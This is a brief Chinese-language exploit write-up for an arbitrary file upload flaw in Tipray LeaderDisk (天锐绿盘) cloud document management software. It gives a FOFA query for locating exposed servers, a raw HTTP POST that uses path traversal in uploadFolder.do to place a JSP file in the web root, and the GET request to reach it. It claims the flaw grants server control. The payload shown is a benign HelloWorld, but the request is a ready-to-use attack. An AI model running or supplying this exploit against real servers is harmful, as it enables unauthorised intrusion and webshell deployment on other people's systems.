# 天锐绿盘云文档安全管理uploadFolder存在文件上传

天锐绿盘云文档安全管理存在任意文件上传漏洞，可以获取服务器权限

## fofa
```
body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"||body="location.href=location.href+\"lddsm\""
```
## poc
```javascript
POST /lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1 HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: [calculated_length]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXqK9dR2yTv7wNpLm

------WebKitFormBoundaryXqK9dR2yTv7wNpLm
Content-Disposition: form-data; name="file"; filename="hello.jsp"
Content-Type: image/png

<% out.println("HelloWorld");%>
------WebKitFormBoundaryXqK9dR2yTv7wNpLm--
```
访问地址
```javascript
GET /hello.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: */*
Connection: close
```
